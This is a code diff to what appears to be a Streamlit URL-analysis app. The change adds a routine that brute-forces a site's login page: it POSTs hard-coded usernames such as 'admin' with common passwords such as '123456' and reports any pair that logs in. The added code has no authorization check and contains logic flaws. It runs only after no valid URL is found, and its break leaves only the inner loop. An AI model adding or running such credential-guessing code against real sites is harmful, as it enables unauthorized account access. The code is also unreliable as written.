@@ -117,12 +117,35 @@ if input_url != "":
                 st.write(f"Brute-forced URL: {final_url}")
             else:
                 st.write("No valid URLs found based on the wordlist")
+                st.write("Attempting to brute force login...")
+                usernames = ['user1', 'user2', 'admin']
+                passwords = ['password1', 'password2', '123456']
+                login_url = final_url 
+                session = requests.Session()
+                for username in usernames:
+                    for password in passwords:
+                        # Prepare the login data
+                        login_data = {
+                            'username': username,
+                            'password': password
+                        }
+                        try:
+                            # Send a POST request to the login URL
+                            response = session.post(login_url, data=login_data)
+                            response_text = response.text
+
+                            # Check if the login was successful based on the response
+                            if 'Login Successful' in response_text:
+                                st.write(f"Successful login - Username: {username}, Password: {password}")
+                                break
+                        except requests.exceptions.RequestException as e:
+                            st.write(f"Request failed: {str(e)}")
+                session.close()
     except requests.RequestException as e:
         st.write(f"{final_url} NA FAILED TO CONNECT {str(e)}")
     except Exception as e:
         print(e)
         st.error("Not sure what went wrong. We'll get back to you shortly.")
-
 
     features_url = ExtractFeatures().url_to_features(url=final_url)
     features_dataframe = pd.DataFrame.from_dict([features_url])
